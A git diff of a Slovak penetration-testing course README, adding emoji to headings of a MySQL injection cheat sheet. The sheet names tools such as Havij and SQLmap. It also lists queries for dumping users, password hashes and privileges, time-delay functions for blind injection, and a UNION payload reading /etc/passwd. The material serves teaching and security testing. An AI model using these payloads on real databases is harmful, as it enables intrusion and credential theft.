@@ -1,6 +1,6 @@
 # 🐱‍💻 Penetration Testing SQL
 Materiály, zdrojové kódy, testovacie sady a prípady, zdroje a návody ku kurzu Penetračné Testovanie, Testovanie softvéru a SQL kurzy
-## GUI nástroje
+## 🧰 GUI nástroje
 ```sql
 -- GUI nástroje
 Havij 
@@ -8,14 +8,14 @@ TyrantSQL -- Treba Python 2.*.* + knižnice
 SQL Power Injector
 Vega
 ```
-## CMD nástroje
+## 🔨 CMD nástroje
 ```sql
 -- CMD nástroje
 SQLmap 
 Hashcat
 ```
 
-## Vyhľadávacie dopyty Google/Bing
+## ☁️ Vyhľadávacie dopyty Google/Bing
 ```sql
 -- Vyhľadávacie dopyty Google/Bing
 PHP + MySQL
@@ -40,26 +40,26 @@ SELECT /* comment */ 1;
 SELECT 1; -- comment
 ```
 
-### Aktuálny používateľ (Current User)	
+### 👤 Aktuálny používateľ (Current User)	
 ```sql
 -- Aktuálny používateľ (Current User)	
 SELECT user();
 SELECT system_user();
 ```
 
-### Zoznam používateľov (List Users)
+### 🧑‍🤝‍🧑 Zoznam používateľov (List Users)
 ```sql
 -- Zoznam používateľov (List Users)
 SELECT user FROM mysql.user; -- priv
 ```
 
-### Zoznam hashov hesiel (List Password Hashes)
+### #️⃣ Zoznam hashov hesiel (List Password Hashes)
 ```sql
 -- Zoznam hashov hesiel (List Password Hashes)	
 SELECT host, user, password FROM mysql.user; -- priv
 ```
 
-### Nástroje na lámanie hesiel (Password crackers)
+### 🔑 Nástroje na lámanie hesiel (Password crackers)
 ```sql
 -- Nástroje na lámanie hesiel (Password crackers)
 -- Password Cracker	
@@ -74,13 +74,13 @@ SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_pr
 SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; 
 ```
 
-### Zoznam oprávnení/privilégií na databáze (List privs on databases (schemas))
+### 🔒 Zoznam oprávnení/privilégií na databáze (List privs on databases (schemas))
 ```sql
 -- Zoznam oprávnení/privilégií na databáze (List privs on databases (schemas))
 SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; -- list privs on columns
 ```
 
-### Zoznam DBA admin účtov List (DBA Accounts)	
+### 🔐 Zoznam DBA admin účtov List (DBA Accounts)	
 ```sql
 -- Zoznam DBA admin účtov List (DBA Accounts)	
 SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';   
@@ -101,20 +101,20 @@ SELECT schema_name FROM information_schema.schemata; -- for MySQL >= v5.0
 SELECT distinct(db) FROM mysql.db -- priv
 ```
 
-### Výpis stĺpcov tabuliek (List Columns)	
+### 🧮 Výpis stĺpcov tabuliek (List Columns)	
 ```sql
 -- List Columns	
 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
 ```
 
-### Zoznam tabuliek (List Tables)	
+### 📋 Zoznam tabuliek (List Tables)	
 ```sql
 -- Zoznam tabuliek (List Tables)	
 SHOW tables;
 SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
 ```
 
-### Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
+###Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
 ```sql
 -- Nájdenie tabulky podľa názvu stĺpca (Find Tables From Column Name)	
 SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'; -- find table which have a column called 'username'
@@ -155,7 +155,7 @@ SELECT cast('1' AS unsigned integer);
 SELECT cast('123' AS char);
 ```
 
-### Spájanie reťazcov, zreťazenie (String Concatenation/join)	
+### 💭 Spájanie reťazcov, zreťazenie (String Concatenation/join)	
 ```sql
 --  Spájanie reťazcov, zreťazenie (String Concatenation/join)	
 SELECT CONCAT('A','B'); # returns AB
@@ -180,7 +180,7 @@ SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A
 SELECT 0×414243; # returns ABC
 ```
 
-### Oneskorenie (Time Delay)	
+### ⏲️ Oneskorenie (Time Delay)	
 ```sql
 -- Oneskorenie (Time Delay)	
 SELECT BENCHMARK(1000000, MD5('A'));
@@ -194,7 +194,7 @@ SELECT SLEEP(5); # >= 5.0.12
 */
 ```
 
-### Prístup k lokálnemu súboru (Local File Access)	
+### 📁 Prístup k lokálnemu súboru (Local File Access)	
 ```sql
 -- Prístup k lokálnemu súboru (Local File Access)	
 …' UNION ALL SELECT LOAD_FILE('/etc/passwd') --  priv, can only read world-readable files
